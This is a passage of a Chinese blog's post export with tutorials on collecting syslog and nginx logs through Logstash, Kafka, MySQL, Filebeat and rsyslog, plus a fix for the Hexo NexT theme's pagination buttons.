          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
            <tag> syslog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>logstash集成kafka，mysql实现数据采集</title>
      <link href="/posts/54e4fd14/"/>
      <url>/posts/54e4fd14/</url>
      
        <content type="html"><![CDATA[<p>logstash是一个非常灵活好用的数据采集框架工具，可以通过简单的配置满足绝大多数数据采集场景的需求。<br>采集数据一个非常典型的场景就是将数据先放到kafka队列里削峰，然后从kafka队列里读取数据到mysql或其他存储系统中进行保存。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200316/blogimage/1.png" alt="从syslog采集日志到kafka然后在从kafka写到mysql数据库中"><br>本文通过一个简单的示例来演示从syslog采集日志到kafka然后在从kafka写到mysql数据库中。<br>默认已经安装好了kafka、mysql、logstash，并已经经过简单的验证。</p><h1 id="准备logstash的环境"><a href="#准备logstash的环境" class="headerlink" title="准备logstash的环境"></a>准备logstash的环境</h1><h2 id="一、下载mysql的jdbc驱动包"><a href="#一、下载mysql的jdbc驱动包" class="headerlink" title="一、下载mysql的jdbc驱动包"></a>一、下载mysql的jdbc驱动包</h2><p>下载地址：<a href="https://mvnrepository.com/artifact/mysql/mysql-connector-java/8.0.15" target="_blank" rel="noopener">https://mvnrepository.com/artifact/mysql/mysql-connector-java/8.0.15</a><br>下载后放到logstash的安装目录的/vendor/jar/目录下</p><h2 id="二、安装logstash插件"><a href="#二、安装logstash插件" class="headerlink" title="二、安装logstash插件"></a>二、安装logstash插件</h2><p>logstash默认安装了kafka插件，但是mysql插件没有默认安装需要自己安装。<br>具体安装方法 /bin/logstash-plugin install logstash-output-jdbc ，这里应为要用到logstash写入mysql数据库，所以安装的插件是logstash-output-jdbc，如果要用到从mysql读数据，那么就要安装logstash-input-jdbc。安装方法类似。<br>因为安装时需要访问国外的源，安装进度很慢很慢，还经常安装不成功，所以需要更改国内的源。<br>也就是给 Ruby 换成国内的镜像站：<a href="https://gems.ruby-china.com/，替代https://rubygems.org。*请注意：国内的镜像站从https://gems.ruby-china.org" target="_blank" rel="noopener">https://gems.ruby-china.com/，替代https://rubygems.org。*请注意：国内的镜像站从https://gems.ruby-china.org</a> 换成了 <a href="https://gems.ruby-china.com" target="_blank" rel="noopener">https://gems.ruby-china.com</a> ！！！* 现在很多网上的资料就都是写的<a href="https://gems.ruby-china.org，导致很多人换了镜像源也装不上。" target="_blank" rel="noopener">https://gems.ruby-china.org，导致很多人换了镜像源也装不上。</a><br>具体方法如下：</p><h3 id="1-安装Gem并更新"><a href="#1-安装Gem并更新" class="headerlink" title="1. 安装Gem并更新"></a>1. 安装Gem并更新</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum install -y gem</span></span><br><span class="line"><span class="comment"># gem -v</span></span><br><span class="line">2.0.14.1</span><br><span class="line"><span class="comment"># gem update --system</span></span><br><span class="line"><span class="comment"># gem -v</span></span><br><span class="line">2.7.7</span><br></pre></td></tr></table></figure><h3 id="2-检查并修改镜像源"><a href="#2-检查并修改镜像源" class="headerlink" title="2. 检查并修改镜像源"></a>2. 检查并修改镜像源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gem sources -l</span></span><br><span class="line">*** CURRENT SOURCES ***</span><br><span class="line"> </span><br><span class="line">https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/</span></span><br><span class="line">https://gems.ruby-china.org/ added to sources</span><br><span class="line">https://rubygems.org/ removed from sources</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat ~/.gemrc </span></span><br><span class="line">---</span><br><span class="line">:backtrace: <span class="literal">false</span></span><br><span class="line">:bulk_threshold: 1000</span><br><span class="line">:sources:</span><br><span class="line">- https://gems.ruby-china.org/</span><br><span class="line">:update_sources: <span class="literal">true</span></span><br><span class="line">:verbose: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><em>请注意：国内的镜像站从<a href="https://gems.ruby-china.org" target="_blank" rel="noopener">https://gems.ruby-china.org</a> 换成了 <a href="https://gems.ruby-china.com" target="_blank" rel="noopener">https://gems.ruby-china.com</a> ！！！现在很多网上的资料就都是写的<a href="https://gems.ruby-china.org，导致很多人换了镜像源也装不上。" target="_blank" rel="noopener">https://gems.ruby-china.org，导致很多人换了镜像源也装不上。</a></em></p><h3 id="3-修改-logstash的-gem-镜像源"><a href="#3-修改-logstash的-gem-镜像源" class="headerlink" title="3. 修改 logstash的 gem 镜像源"></a>3. 修改 logstash的 gem 镜像源</h3><p>cd到logstach的安装目录，可以看到Gemfile文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi Gemfile</span></span><br><span class="line"><span class="comment"># This is a Logstash generated Gemfile.</span></span><br><span class="line"><span class="comment"># If you modify this file manually all comments and formatting will be lost.</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">source</span> <span class="string">"https://rubygems.org"</span></span><br><span class="line">gem <span class="string">"logstash-core"</span>, :path =&gt; <span class="string">"./logstash-core"</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>更改默认的 <a href="https://rubygems.org" target="_blank" rel="noopener">https://rubygems.org</a> 为<a href="https://gems.ruby-china.com" target="_blank" rel="noopener">https://gems.ruby-china.com</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200316/blogimage/2.png" alt="更换国内镜像源地址"></p><h3 id="4-安装-logstash-output-jdbc"><a href="#4-安装-logstash-output-jdbc" class="headerlink" title="4. 安装 logstash-output-jdbc"></a>4. 安装 logstash-output-jdbc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/bin/logstash-plugin install logstash-output-jdbc</span></span><br><span class="line">Validating logstash-output-jdbc</span><br><span class="line">Installing logstash-output-jdbc</span><br><span class="line">Installation successful</span><br></pre></td></tr></table></figure><h3 id="5-查看插件是否安装成功"><a href="#5-查看插件是否安装成功" class="headerlink" title="5.查看插件是否安装成功"></a>5.查看插件是否安装成功</h3><p>在logstash的bin目录下执行./logstash-plugin list 可以查看已经安装的插件，可以看到logstash-output-jdbc的插件已经装好。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200316/blogimage/3.png" alt="检查插件安装"></p><h1 id="配置logstash"><a href="#配置logstash" class="headerlink" title="配置logstash"></a>配置logstash</h1><p>新建一个pipline.conf的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="built_in">test</span>-pipeline.conf</span><br></pre></td></tr></table></figure><p>文件内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    stdin&#123;            #用于测试标准控制台输入的数据</span><br><span class="line">      type =&gt; <span class="string">"test-log"</span></span><br><span class="line">    &#125;</span><br><span class="line">    syslog&#123;           #用于接收来自syslog的日志</span><br><span class="line">        type =&gt; <span class="string">"test-log"</span></span><br><span class="line">        port =&gt; <span class="number">514</span></span><br><span class="line">    &#125;</span><br><span class="line">    kafka &#123;</span><br><span class="line">       bootstrap_servers =&gt; "172.28.65.26:9092" #kafka服务器地址</span><br><span class="line">       topics =&gt; "test1"           #kafka订阅的topic主题</span><br><span class="line">       codec =&gt; "json" #写入的时候使用json编码，因为logstash收集后会转换成json格式</span><br><span class="line">       consumer_threads =&gt; <span class="number">1</span></span><br><span class="line">       decorate_events =&gt; <span class="literal">true</span></span><br><span class="line">       add_field =&gt; &#123;</span><br><span class="line">             <span class="string">"logsource"</span> =&gt; <span class="string">"kafkalog"</span></span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">output</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ([type]==<span class="string">"test-log"</span> and <span class="string">"kafkalog"</span> not <span class="keyword">in</span> [logsource]) &#123;</span><br><span class="line">       kafka &#123;</span><br><span class="line">            codec =&gt; json</span><br><span class="line">            topic_id =&gt; <span class="string">"test1"</span></span><br><span class="line">            bootstrap_servers =&gt; <span class="string">"172.28.65.26:9092"</span></span><br><span class="line">            batch_size =&gt; <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ([type] == <span class="string">"test-log"</span> and <span class="string">"kafkalog"</span> <span class="keyword">in</span> [logsource]) &#123;</span><br><span class="line">        jdbc &#123;</span><br><span class="line">            driver_jar_path =&gt; <span class="string">"/opt/elk/logstash-7.6.0/vendor/jar/jdbc/mysql-connector-java-8.0.15.jar"</span></span><br><span class="line">            driver_class =&gt; <span class="string">"com.mysql.jdbc.Driver"</span></span><br><span class="line">            connection_string =&gt; <span class="string">"jdbc:mysql://172.28.65.32:3306/testdb?user=yourdbuser&amp;password=yourpassword"</span></span><br><span class="line">            statement =&gt; [ <span class="string">"INSERT INTO test_nginx_log (message) VALUES(?)"</span>, <span class="string">"message"</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    stdout &#123;</span><br><span class="line">       codec =&gt; rubydebug</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个逻辑就是从stdin或syslog接收数据output到kafka,然后从kafka中取出数据加入了一个logsource的字标识是从kafka过来的数据，然后又output到 jdbc写到mysql中去。<br>如果没有这几个if的逻辑判断，那么就会是个死循环。从kafka读同样的数据又写到kafka中。如果在两台机器上装有logstash一台取数据放到kafka,一台从kafka中取数据放到mysql中就可以不用加这样的判断逻辑会单纯简单一些。</p><h1 id="执行logstash并查看效果"><a href="#执行logstash并查看效果" class="headerlink" title="执行logstash并查看效果"></a>执行logstash并查看效果</h1><p>通过在logstash安装目录下执行 bin/logstash -f test-pipeline.conf –config.test_and_exit 检查配置文件是否有问题，没有问题以后执行bin/logstash -f test-pipeline.conf –config.reload.automatic 运行logstash。<br>在控制台输入 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this is a <span class="built_in">test</span>!</span><br></pre></td></tr></table></figure><p><strong>效果：</strong><br>从控制台输入信息，可以看到从stdin输入output到stdout的没有logsource标识，input从kafka订阅过来的信息加了一个logsource=&gt;kafkalog的标识。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200316/blogimage/4.png" alt="logsource=&gt;kafkalog的标识"><br>用kafka tool工具看到kafka收到了从stdin发过来的信息。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200316/blogimage/5.png" alt="用kafka tool工具看到kafka收到了从stdin发过来的信息"><br>在看MySQL表里的数据，已经通过logstash从kafka中将数据采集到了MySQL的表中。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200316/blogimage/6.png" alt="MySQL的表的信息数据"><br>再来看从syslog采集日志的效果<br>从控制台看到的信息效果<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200316/blogimage/7.png" alt="控制台看到的信息效果"><br>从kafka tool看到的效果<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200316/blogimage/8.png" alt="kafka tool看到的效果"><br>从mysql 表中看到的效果。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200316/blogimage/9.png" alt="mysql 表中看到的效果"><br><strong>可以看到，logstash是一个非常灵活好用的数据采集框架工具，可以通过简单的配置就能满足绝大多数数据采集场景的需求。</strong></p><hr><p>作者博客:<a href="http://xiejava.ishareread.com" target="_blank" rel="noopener">http://xiejava.ishareread.com</a></p><br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
            <tag> ELK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Hexo博客模板hexo-theme-next的翻页按钮不正常显示问题</title>
      <link href="/posts/272f3054/"/>
      <url>/posts/272f3054/</url>
      
        <content type="html"><![CDATA[<p>用Hexo搭了个Gitpage的博客，兴冲冲的发了11篇博文后发现翻页按钮不正常显示，显示为<code>&lt;i class=&quot;fa fa-angle-right&quot;&gt;&lt;/i&gt;</code>的HTML编码。如下图：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200310/blogimage/1.png" alt="HTML编码"><br><code>&lt;i class=&quot;fa fa-angle-right&quot;&gt;&lt;/i&gt;</code>这是个什么鬼？<br>这是一个Font Awesome的字体图标，按道理来说这个图标应该可以正常显示的，现在这个图标不能显示了显示成了html源码。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200310/blogimage/2.png" alt="Font Awesone图标"><br><strong>解决办法:</strong><br>最简单的办法就是将<code>&lt;i class=&quot;fa fa-angle-right&quot;&gt;&lt;/i&gt;</code>这个不能正常显示的字体图标改成一般的字符，我这里就是改成正常的一般左右键字符“&gt;”，“&lt;”。<br>在 themes\hexo-theme-next\layout_partials 下找到hexo-theme-next的翻页组件，就是pagination.swig<br>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if page.prev or page.next %&#125;</span><br><span class="line">  &lt;nav class&#x3D;&quot;pagination&quot;&gt;</span><br><span class="line">    &#123;&#123;</span><br><span class="line">      paginator(&#123;</span><br><span class="line">        prev_text: &#39;&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;&#39;,</span><br><span class="line">        next_text: &#39;&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;&#39;,</span><br><span class="line">        mid_size: 1</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;&#125;</span><br><span class="line">  &lt;&#x2F;nav&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>改成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if page.prev or page.next %&#125;</span><br><span class="line">  &lt;nav class&#x3D;&quot;pagination&quot;&gt;</span><br><span class="line">    &#123;&#123;</span><br><span class="line">      paginator(&#123;</span><br><span class="line">        prev_text: &#39;&lt;&#39;,</span><br><span class="line">        next_text: &#39;&gt;&#39;,</span><br><span class="line">        mid_size: 1</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;&#125;</span><br><span class="line">  &lt;&#x2F;nav&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>重新发布以后可以看到翻页按钮可以正常显示了<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200310/blogimage/3.png" alt="正常显示箭头"></p><hr><p>作者博客:<a href="http://xiejava.ishareread.com" target="_blank" rel="noopener">http://xiejava.ishareread.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过filebeat、logstash、rsyslog采集nginx日志的几种方式</title>
      <link href="/posts/f3e97829/"/>
      <url>/posts/f3e97829/</url>
      
        <content type="html"><![CDATA[<p>由于nginx功能强大，性能突出，越来越多的web应用采用nginx作为http和反向代理的web服务器。而nginx的访问日志不管是做用户行为分析还是安全分析都是非常重要的数据源之一。如何有效便捷的采集nginx的日志进行有效的分析成为大家关注的问题。本文通过几个实例来介绍如何通过filebeat、logstash、rsyslog采集nginx的访问日志和错误日志。</p><p>大家都知道ELK技术栈是采集、分析日志的利器。所以这里介绍的是从nginx采集日志到ES。当然至于日志采集以后存到看大家的需要。通过logstash可以方便的配置日志输出存储的方式。</p><p>一般来说nginx默认安装后，日志文件在 /usr/local/nginx/logs 目录下。分别有 access.log和error.log 访问日志和错误日志。<br>这次示例Elasitcsearch是三个节点组成的集群172.28.65.22、172.28.65.23、172.28.65.24，172.28.65.30 是kibana的地址，172.28.65.32是数据采集服务器，上面装有logstash、nginx、 filebeat。一般来说采集服务器上有logstash，而nginx、 filebeat应该是装在采集目标上。</p><h2 id="一、直接通过filebeat采集日志到ES"><a href="#一、直接通过filebeat采集日志到ES" class="headerlink" title="一、直接通过filebeat采集日志到ES"></a>一、直接通过filebeat采集日志到ES</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/1.png" alt="filebeat到ES"><br>在filebeat的安装目录找到filebeat.yml 配置获取日志文件的路径及输出到ES的配置。<br> 具体：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- type: log</span><br><span class="line">  <span class="comment"># Change to true to enable this input configuration.</span></span><br><span class="line">  enabled: true</span><br><span class="line">  <span class="comment"># Paths that should be crawled and fetched. Glob based paths.</span></span><br><span class="line">  paths:</span><br><span class="line">    <span class="comment">#- /var/log/*.log</span></span><br><span class="line">    - /usr/local/nginx/logs/*.log</span><br><span class="line">    <span class="comment">#- c:\programdata\elasticsearch\logs\*</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/2.png" alt="filebeat.yml配置"><br>如果需要在kibana中友好显示的化，可进行kibana配置<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/3.png" alt="kibana配置"><br>输出到es中，在hosts中配置好你的ES服务地址。如果单机只有一个节点，就可以只配一个ip和端口。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/4.png" alt="filebeat.yml配置中配置es"><br>启动filebeat 进行日志数据采集</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./filebeat <span class="literal">-e</span> <span class="literal">-c</span> filebeat.yml <span class="literal">-d</span> <span class="string">"publish"</span></span><br></pre></td></tr></table></figure><p>通过elasticsearch-head插件查看es索引中的日志信息<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/5.png" alt="elasticsearch-head插件查看es索引"><br>可以看到nginx中的access.log和error.log的日志都已经上来了。<br>在kibana中通过filebeat-*过滤看filebeat的索引，可以看到通过filebeat采过来的数据。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/6.png" alt="kibana中通过filebeat-*过滤看filebeat的索引"><br>这种直接通过filebeat直接对接ES采日志的方式简单直接，但是无法对采集的日志进行预处理和其他一些操作，也不够灵活。<br>可以在filebeat 和 ES之间加一层Logstash，可以将filebeat于ES解耦，通过Logstash可以做一些预处理，也可以通过Logstash采集到除ES以外的其他数据存储上。</p><h2 id="二、通过filebeat采集日志到logstash再送到ES"><a href="#二、通过filebeat采集日志到logstash再送到ES" class="headerlink" title="二、通过filebeat采集日志到logstash再送到ES"></a>二、通过filebeat采集日志到logstash再送到ES</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/7.png" alt="通过filebeat采集日志到logstash再送到ES"><br>首先得安装 logstash ，安装完后在logstash的安装目录下新建vi filebeat-pipeline.conf<br>filebeat-pipeline.conf的具体配置如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    beats &#123;</span><br><span class="line">        port =&gt; <span class="string">"5044"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">    elasticsearch &#123; hosts =&gt; [<span class="string">"172.28.65.24:9200"</span>] &#125;</span><br><span class="line">    stdout &#123; codec =&gt; rubydebug&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>input配置表示通过5044端口接收beats的数据<br>output配置表示输出到elasticsearch，并且同时输出到标准输出也就是控制台。<br>然后通过命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/logstash <span class="operator">-f</span> filebeat<span class="literal">-pipeline</span>.conf -<span class="literal">-config</span>.reload.automatic</span><br></pre></td></tr></table></figure><p>应用filebeat-pipeline.conf启动logstash。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/8.png" alt="应用filebeat-pipeline.conf启动logstash"><br>启动以后可以看到logstash的启动日志5044端口的服务已经起了，可以接受通过filebeat通过5044端口传过来的数据了。<br>接下来配置filebeat<br>在filebeat的安装目录找到filebeat.yml 配置获取日志文件的路径及输出到logstash的配置。不直接输出到ES了。<br>具体配置如下：<br>将output.elasticsearch的配置屏蔽<br>配置output.logstash，配置正确的logstash的服务主机和端口<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/9.png" alt="配置output.logstash"><br>启动filebeat 进行日志数据采集</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./filebeat <span class="literal">-e</span> <span class="literal">-c</span> filebeat.yml <span class="literal">-d</span> <span class="string">"publish"</span></span><br></pre></td></tr></table></figure><p>我们访问nginx服务提供的web服务<a href="http://172.28.65.32/" target="_blank" rel="noopener">http://172.28.65.32/</a><br>在logstash的控制台 可以看到相应的访问access.log 日志<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/10.png" alt="logstash的控制台 可以看到相应的访问access.log 日志"><br>同时在ES 中也可以看到有相应的日志数据<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/11.png" alt="在ES 中也可以看到有相应的日志数据"></p><h2 id="三、直接通过rsyslog采集日志到logstash在送到ES"><a href="#三、直接通过rsyslog采集日志到logstash在送到ES" class="headerlink" title="三、直接通过rsyslog采集日志到logstash在送到ES"></a>三、直接通过rsyslog采集日志到logstash在送到ES</h2><p>在很多情况下你需要采集的web服务器并不是自己能够控制的，不是说你想装filebeat就可以让你装的，这时候就可以要求目标数据源通过 syslog  的方式将日志发出来。我们可以再通过 logstash送到ES或其他的日志存储处理平台。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/12.png" alt="直接通过rsyslog采集日志到logstash在送到ES"><br>通过syslog往日志服务器上发nginx的日志有两种方式，一种就是利用nginx的配置往外发日志，一种就是通过配置linux的rsyslog的配置往外发日志。</p><h3 id="通过nginx配置发送syslog到logstash"><a href="#通过nginx配置发送syslog到logstash" class="headerlink" title="通过nginx配置发送syslog到logstash"></a>通过nginx配置发送syslog到logstash</h3><p>参考见nginx官方文档：<a href="http://nginx.org/en/docs/syslog.html" target="_blank" rel="noopener">http://nginx.org/en/docs/syslog.html</a><br>具体配置如下：<br>在nginx的配置文件nginx.conf中<br>在server下配置access_log和error_log的输出方式</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">access_log syslog:server=<span class="number">172.28</span>.<span class="number">65.32</span>:<span class="number">514</span>,facility=local7,tag=nginx_access_log,severity=info;</span><br><span class="line">error_log syslog:server=<span class="number">172.28</span>.<span class="number">65.32</span>:<span class="number">514</span>,facility=local7,tag=nginx_error_log,severity=info;</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/13.png" alt="nginx.conf配置"><br>配置完成后执行 <code>./nginx -s reload</code> 使配置生效。这样就通过linux的rsyslog服务将nginx的日志往外发了。<br>接着来配置logstash的syslog的服务接收配置 。在logstash的安装目录下新建<code>vi syslog-pipeline.conf</code><br>syslog-pipeline.conf的具体配置如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    syslog&#123;</span><br><span class="line">        type =&gt; <span class="string">"system-syslog"</span></span><br><span class="line">        port =&gt; <span class="number">514</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">    elasticsearch &#123;</span><br><span class="line">        hosts =&gt; [<span class="string">"172.28.65.24:9200"</span>]</span><br><span class="line">        index =&gt; <span class="string">"system-syslog-%&#123;+YYYY.MM&#125;"</span></span><br><span class="line">    &#125;</span><br><span class="line">    stdout &#123; codec =&gt; rubydebug&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>input配置表示通过514端口接收syslog的数据<br>output配置表示输出到elasticsearch，并且同时输出到标准输出也就是控制台。<br>通过执行 <code>bin/logstash -f syslog-pipeline.conf --config.reload.automatic</code> 启动logstash<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/14.png" alt="可以看到logstash启动以后开启了514端口的tcp和upd协议的侦听"><br>可以看到logstash启动以后开启了514端口的tcp和upd协议的侦听。<br>我们访问nginx服务提供的web服务<a href="http://172.28.65.32/" target="_blank" rel="noopener">http://172.28.65.32/</a><br>在logstash的控制台 可以看到相应的nginx访问access和error的日志<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/15.png" alt="logstash的控制台可以看到相应的nginx访问access和error的日志"><br>同样通过Elasticsearch-head在ES 中也可以看到有相应的日志数据<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/16.png" alt="通过Elasticsearch-head在ES 中也可以看到有相应的日志"></p><h3 id="通过配置rsyslog发送syslog日志到logstash"><a href="#通过配置rsyslog发送syslog日志到logstash" class="headerlink" title="通过配置rsyslog发送syslog日志到logstash"></a>通过配置rsyslog发送syslog日志到logstash</h3><p>有些老版本的nginx不支持配置syslog输出日志，或者说我想输出其他不是nginx的日志该怎么办呢？可以通过直接配置rsyslog的方式来往外发送日志。<br>在/etc/rsyslog.conf 中配置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IncludeConfig</span> /etc/rsyslog.d/*.conf</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200309/blogimage/17.png" alt="/etc/rsyslog.conf"><br>意思是可以引用外部的配置文件，引用外部的配置文件一方面可以不影响主配置文件，另一方面也比较好管理<br>在/etc/rsyslog.d目录下新建nginx-log.conf<br>配置如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 